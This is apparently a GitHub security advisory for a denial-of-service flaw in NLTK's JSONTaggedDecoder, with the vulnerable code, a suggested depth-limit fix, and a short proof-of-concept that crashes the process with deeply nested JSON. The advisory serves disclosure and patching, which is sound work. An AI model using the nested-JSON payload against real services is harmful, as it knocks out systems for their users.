# [M] Natural Language Toolkit (NLTK) has unbounded recursion in JSONTaggedDecoder.decode_obj() may cause DoS

## Summary
Severity: Medium
Advisory: GHSA-rf74-v2fm-23pw
CVE: CVE-2026-66393
CWE: CWE-674
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-rf74-v2fm-23pw
Type: github-advisory

## Affected
- PyPI: `nltk` — affected >=0 <3.9.4

## Details
### Summary
`JSONTaggedDecoder.decode_obj()` in `nltk/jsontags.py` calls itself 
recursively without any depth limit. A deeply nested JSON structure 
exceeding `sys.getrecursionlimit()` (default: 1000) will raise an 
unhandled `RecursionError`, crashing the Python process.

### Affected code
File: `nltk/jsontags.py`, lines 47–52
```python
@classmethod
def decode_obj(cls, obj):
    if isinstance(obj, dict):
        obj = {key: cls.decode_obj(val) for (key, val) in obj.items()}
    elif isinstance(obj, list):
        obj = list(cls.decode_obj(val) for val in obj)
```

### Proof of Concept
```python
import sys, json
from nltk.jsontags import JSONTaggedDecoder

depth = sys.getrecursionlimit() + 50  # e.g. 1050
payload = '{"x":' * depth + "null" + "}" * depth

# Raises RecursionError, crashing the process
json.loads(payload, cls=JSONTaggedDecoder)
```

### Impact
Any code path that passes externally-supplied JSON to 
`JSONTaggedDecoder` is vulnerable to denial of service.
The severity depends on whether such a path exists in the 
calling code (e.g. `nltk/data.py`).

### Suggested Fix
Add a depth parameter with a hard limit:
```python
@classmethod
def decode_obj(cls, obj, _depth=0):
    if _depth > 100:
        raise ValueError("JSON nesting too deep")
    if isinstance(obj, dict):
        obj = {key: cls.decode_obj(val, _depth + 1) 
               for (key, val) in obj.items()}
    elif isinstance(obj, list):
        obj = list(cls.decode_obj(val, _depth + 1) for val in obj)
```

## References
- https://github.com/nltk/nltk/security/advisories/GHSA-rf74-v2fm-23pw
- https://nvd.nist.gov/vuln/detail/CVE-2026-66393
- https://github.com/nltk/nltk/commit/00cdcd392142e6c745e7120c8d50a24127df5fad
- https://github.com/nltk/nltk
- https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3724.yaml
- https://www.vulncheck.com/advisories/nltk-before-denial-of-service-via-jsontaggeddecoder
